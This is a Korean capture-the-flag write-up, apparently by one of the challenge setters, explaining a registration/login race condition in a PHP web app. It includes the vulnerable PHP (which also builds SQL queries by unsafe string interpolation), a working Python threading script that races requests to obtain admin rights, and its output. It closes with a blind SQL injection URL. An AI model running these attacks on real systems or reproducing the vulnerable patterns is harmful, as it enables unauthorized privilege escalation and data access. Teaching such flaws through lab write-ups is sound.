BoB Web Hacking CTF 강남백반 팀 Write-Up
============
2016.08.27 강남 미림타워 BoB 센터에서 작성<br>
2016.08.31 한양대학교 ERICA 캠퍼스에서 업로드
<br>
출제도 풀이도 모두 즐거웠던 BoB Web Hacking CTF가 끝이 났습니다. 출제를 할 당시에, 많은 분들이 해킹에 능통하시기 때문에 처음에는 조금 더 복잡한 형태의 문제를 내길 바랬습니다만, 만들면 만들수록 억지스러운 방법을 요구하는 것 같아서 최대한 자연스러운 형태로 접근하기 어려운 문제를 내어보고자 하는 취지에서 간단한 Race Condition 문제를 출제 했습니다. 실제로 대회에서도 기대했던 대로 3-4팀 정도가 풀어 주셨습니다.
<br>
# 1. 의도한 취약점 : Race Condition
원래의 의도는 게시판에서는 어떠한 취약점도 발견이 되지 않도록 해서, 게시판 취약점을 찾는 것을 포기하게 하고, 로그인 부분에서 두 번의 Request가 들어가는 것, 그리고 관리자 전용 로그인 페이지와 일반 유저의 로그인 페이지가 하나의 인증을 경유한다는 점을 들어 인증 정보를 따로 보내 준다는 것을 눈치 채고 Race Condtion을 이용한다는 시나리오입니다.<br><br>
Auth.php를 보면
<pre><code>
    $query = "INSERT INTO member (id,pass,name,mail,phonenumber) VALUES ('$nick','$word','$name','$mail','$number')";

	$results = mysqli_query($db,$query);
		
	$sql = "INSERT into access (id, Auth) values ((select id from member where id='$nick'), 'TRUE');";

  	mysqli_query($db, $sql);

	mysqli_close($db);
	
</code></pre>
위와 같이 두 번의 INSERT 문을 거칩니다. 그 말은 곧, 두 쿼리문 사이에 미세한 시간의 차이가 발생한다는 의미입니다.<br><br>
그리고 관리자 로그인 페이지와 일반 로그인 페이지가 모두 거치는 인증 페이지인 login_check.php를 보면,
<pre><code>         
        $uid = $arr['id'];
      		$sql = "SELECT Auth from access where id='$uid' and Auth='TRUE';";
		$result = mysqli_query($db,$sql);
		$arr = $result->fetch_assoc();
	
		if($arr['Auth']){
		$_SESSION['user_id'] = $uid;
		echo "<script>alert(\"로그인 성공~!! $uid 님 환영합니다!\");
		location.replace('list.php');</script>";
		}

		else{
		$_SESSION['user_id'] = $uid;
		$q = "update member set role='admin' where id='$uid'";
		$result = mysqli_query($db,$q);
		echo "<script>alert(\"관리자님 환영합니다!\");
		location.replace('list.php');</script>";
		}
		
</code></pre>
Auth 인자가 True일 경우에는, 일반 사용자로 로그인이 되고, False일 경우에는 관리자 권한 재부여와 함께 관리자 페이지로 이동을 합니다. 이 때, 회원가입에서 Auth 인자가 부여되기 전에 로그인을 하면, Auth 인자는 NULL값이므로, False로 취급되어 관리자 권한을 부여받을 수 있게 되는 취약점이 있는 것입니다. 
<br><br>
저는 다음과 같은 공격 코드를 작성하여 관리자 권한을 취득 했습니다.
<pre><code>
#!/usr/bin/env python3

import requests
import string
import re
import random
import threading

url_register = "http://192.168.1.103/auth.php"
url_login = "http://192.168.1.103/login_check.php"

def register(username, password):
	data = {'nick' : username, 'word' : password,'words' : password, 'name' : 'hacker', 'mail' : 'admin@hacker.com', 'number' : '01022223333'}
	a = requests.post(url_register, data=data).content.decode('UTF-8')
	if a.find("성공") != -1:
		print("등록 성공")
	else :
		print("등록 실패")

def login(username, password):
	data = {'id' : username, 'pw' : password}
	c = requests.post(url_login, data=data).content.decode('UTF-8')
	if c.find("관리자님") != -1:
		print("관리자 아이디 : "+username+" 관리자 비밀번호 : "+password)
	else:
		print("일반 계정이 생성됨")

while True:
	username = ''.join(random.choice(string.ascii_letters) for _ in range(10))
	password = 'hacker'

	t1 = threading.Thread(target=register, args=(username, password,))
	t2 = threading.Thread(target=login, args=(username, password,))
	t1.start()
	t2.start()
	t1.join()
	t2.join()
	
</code></pre>
위 코드의 실행 결과는 다음과 같습니다.
<pre><code>
등록 성공
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
등록 성공
등록 성공
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
등록 성공
등록 성공
관리자 아이디 : doUEALiMWf 관리자 비밀번호 : hacker
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
등록 성공
일반 계정이 생성됨
등록 성공

</code></pre>

몇 번의 시도 끝에 관리자 계정이 생성이 되고, 해당 관리자 계정을 이용해 관리자 페이지로 접근을 하면, 회원 데이터베이스를 열람할 수 있으므로, 그 곳에 있는 플래그 값인 **MoM\_NoW\_1\_Kn0W\_Wh4T\_tIM1NG\_I5**를 확인 할 수 있습니다.

# 2. 의도하지 않은 취약점 : SQL Blind Injection

게시판을 완전히 취약점 없는 상태로 만들고자 했던 저희의 바램과는 달리, 게시판에는 취약점이 있었는데, 그것이 SQL Blind Injection입니다. <br>
<pre><code>http://192.168.1.103/download.php?No=IF((1=2),178,176)</pre></code>
위와 같이, download.php의 No 인자에 SQL Blind Injection이 가능해서 DB의 대부분의 정보를 열람할 수 있습니다.<br>
간단한 스크립트를 이용하면 플래그를 알아내는 것도 시간 문제였을 것입니다. <br>
저희의 풀이는 여기까지입니다. 저는 게시판 개발자를 죽이러 가야해서 여기서 그만 줄이겠습니다. 감사합니다.